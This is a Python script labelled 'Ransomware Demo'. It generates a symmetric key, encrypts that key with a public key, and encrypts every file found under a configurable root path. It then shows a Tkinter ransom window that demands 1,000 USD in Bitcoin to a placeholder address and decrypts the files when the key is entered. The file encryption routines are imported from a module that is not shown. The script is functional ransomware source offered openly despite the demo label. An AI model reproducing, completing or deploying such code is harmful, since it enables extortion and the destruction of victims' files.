import argparse
import os
import base64
from cryptography.fernet import Fernet
from core import encrypt_symmetric_key, find_files, encrypt_file, decrypt_file, load_key_from_file
from tkinter import *
import tkinter as tk
import tkinter.messagebox

if __name__ == "__main__":

    # parse cli flags
    parser = argparse.ArgumentParser(description="public-key")
    parser.add_argument(
        "--pub",
        dest="public_key_file",
        default="./public_key.pem",
        help="the public key to encrypt the sym key with"
    )
    parser.add_argument(
        "--path",
        dest="os_root_path",
        default="os_root",
        help="""the directory to start encrypting from, can be changed to a
        specific folder to run on that folder only"""
    )
    parser.add_argument(
        "--enc-sym-key",
        dest="enc_sym_key",
        default="./",
        help="the location to save the encrypted sym key"
    )
    args = parser.parse_args()
    public_key_file = args.public_key_file
    os_root_path = args.os_root_path
    enc_sym_key = args.enc_sym_key + "key"

    # check if the key already exists, if it does then don't encrypt again
    if not os.path.exists(enc_sym_key):

        # generate the sym key
        key = Fernet.generate_key()

        # encrypt the sym key with public key
        encrypted_key = encrypt_symmetric_key(
            key,
            public_key_filepath=public_key_file
        )

        # save the encrypted sym key
        with open(enc_sym_key, 'wb') as f:
            f.write(base64.b64encode(encrypted_key))

        # find all files and encrypt them
        files = find_files(os_root_path)
        for file in files:
            print(f'encrypted {file}')
            encrypt_file(file, key)

    with open(enc_sym_key, 'r') as f:
        encrypted_key = f.read()
    # show gui
    window = Tk()
    window.title("Ransomware Demo")

    desc_text = f"Your files have been encrypted, to claim your files back, send 1,000 USD of BTC to the following address and message to unlock your files\n\n"
    desc = tk.Text(window, borderwidth=0, height=15)
    desc2_text = f"address: btc-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n"
    desc3_text = f"message: {encrypted_key}\n\n"
    desc.insert(1.0, desc_text + desc2_text + desc3_text)
    desc.pack()


    label = tk.Label(window, text="Decryption key")
    label.pack()

    entry = tk.Entry(window, width=50)
    entry.pack()

    def get_textbox():
        # load the key
        key = entry.get()
        if key.strip() == "":
            tkinter.messagebox.showinfo("invalid decryption key", "make payment to the above btc address to get your decryption key")
        else:
            print("Value from text box:", key)
            l_key = key

            # decrypt all files that were encrypted
            files = find_files(os_root_path)
            for file in files:
                print(f"decrypted {file}")
                decrypt_file(file, l_key)

            # success message
            tkinter.messagebox.showinfo("decrypt files", "decrypted files with the given key")
            entry.delete(0, tk.END)
    button = tk.Button(window, text="Decrypt", command=get_textbox)
    button.pack()

    window.mainloop()
